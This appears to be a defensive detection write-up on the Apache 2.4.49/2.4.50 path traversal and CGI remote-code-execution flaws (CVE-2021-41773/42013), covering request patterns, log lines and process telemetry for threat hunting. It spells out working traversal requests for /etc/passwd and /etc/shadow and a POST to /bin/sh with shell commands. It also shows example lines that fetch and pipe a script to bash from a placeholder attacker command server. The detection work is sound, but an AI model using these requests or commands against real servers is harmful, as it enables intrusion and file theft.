**Synopsis:** A path traversal vulnerability in Apache HTTP Server 2.4.49 allows unauthenticated remote attackers to read arbitrary files outside the document root, and achieve **Remote Code Execution (RCE)** if `mod_cgi` or `mod_cgid` is enabled. The flaw stems from a defect in URL normalization that allows percent-encoded path sequences (e.g., `%2e%2e/`) to bypass traversal protections introduced in earlier versions.

> **Note:** CVE-2021-42013 is the bypass of the incomplete CVE-2021-41773 patch, affecting Apache 2.4.50. Remediation must address both. The only safe version is **2.4.51 or later**.

### Exploitation Conditions

**Minimum conditions for file read (LFI path):**
- Apache HTTP Server version **exactly 2.4.49** is running
- A URI-mapped path (e.g., via `Alias` directive or document root) exists that does **not** enforce `Require all denied`
- Default `Options` include traversal-capable directory exposure

**Additional conditions for RCE:**
- `mod_cgi` or `mod_cgid` module is **loaded and enabled**
- CGI execution is permitted on a reachable path (commonly `/cgi-bin/`)

### Exploitation Mechanism

The Apache URL normalization routine in 2.4.49 fails to correctly decode and resolve percent-encoded dot-dot sequences prior to applying access controls. An attacker crafts a URI containing sequences such as:

/.%2e/          → decoded as  /../
/%%32%65%%32%65/ → double-encoded variant (CVE-2021-42013)

These sequences traverse directory boundaries, escaping the configured document root or aliased path into the underlying filesystem. When combined with a POST request to a CGI endpoint with a shell payload in the request body, this achieves unauthenticated RCE as the `www-data` (or equivalent Apache runtime) user.

## Observable Behaviour

### HTTP Request Patterns (Wire-Level Indicators)

#### Pattern 1 — File Read via Path Traversal
GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: <target>

GET /icons/.%2e/%2e%2e/%2e%2e/etc/shadow HTTP/1.1
Host: <target>

**Key observable:** Percent-encoded `.` characters (`%2e`) within the URI path, producing traversal sequences that would be caught by a decoded-path check but bypass the raw-path check in 2.4.49.

#### Pattern 2 — RCE via mod_cgi POST
POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded
Content-Length: <n>

echo Content-Type: text/plain; echo; id; uname -a; cat /etc/passwd

**Key observables:**
- HTTP method: `POST`
- URI terminates in a shell binary path (e.g., `/bin/sh`, `/bin/bash`)
- `Content-Type: application/x-www-form-urlencoded` with shell commands in body
- Response body contains command output (e.g., `uid=`, `Linux`, `/etc/passwd` content)

#### Pattern 3 — Automated Scanner Fingerprinting
GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1
User-Agent: <variable — scanners, curl, python-requests>

**Note:** Automated exploitation frameworks (Nuclei templates, Metasploit module `exploit/multi/http/apache_normalize_path_rce`) produce highly consistent URI structures. Watch for rapid sequential requests from single source IPs.

### Web Server Log Patterns

In Apache `access.log`, look for:
<src_ip> - - [timestamp] "GET /cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1" 200 <bytes>
<src_ip> - - [timestamp] "POST /cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1" 200 <bytes>

**Critical signal:** HTTP 200 response to a traversal URI — this confirms successful exploitation, not merely an attempt.

### Endpoint / Process Telemetry

If RCE occurs, the Apache worker process (`httpd`, `apache2`) will **spawn a child shell process**. This is anomalous and highly suspicious.

**Expected anomalous process chain:**
apache2 (pid: X)
  └─ sh / bash (pid: Y)          ← ALERT: shell spawned by web server
       ├─ id
       ├─ whoami
       ├─ cat /etc/passwd
       ├─ wget http://<attacker_c2>/payload -O /tmp/payload   ← payload staging
       └─ curl http://<attacker_c2>/shell.sh | bash           ← common C2 pattern

**EDR/Endpoint hunting query concept:**
parent_process_name IN ("apache2", "httpd") 
AND child_process_name IN ("sh", "bash", "dash", "python", "perl", "wget", "curl")
